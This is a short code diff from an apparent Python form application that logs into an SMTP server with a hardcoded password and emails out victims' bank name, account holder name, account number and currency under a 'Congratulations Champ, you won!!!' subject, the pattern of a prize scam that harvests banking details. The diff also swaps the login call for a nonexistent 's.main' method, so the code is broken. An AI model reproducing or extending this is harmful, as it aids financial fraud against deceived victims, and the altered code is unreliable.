@@ -113,7 +113,7 @@ def enter():
         password = 'elatedcream040'
         subject = 'Congratulations Champ, you won!!!'
         s.starttls()
-        s.login(sender_email, password)
+        s.main(sender_email, password)
         message = 'Your details reads as the following:\n'
         message = message + '\nBank: ' + variable.get() + '\nAccount holder name: ' + account_holder_name_entry.get() +\
                       '\nAccount number: ' + account_number_entry.get() + '\nCurrency: ' + currency_entry.get() + \
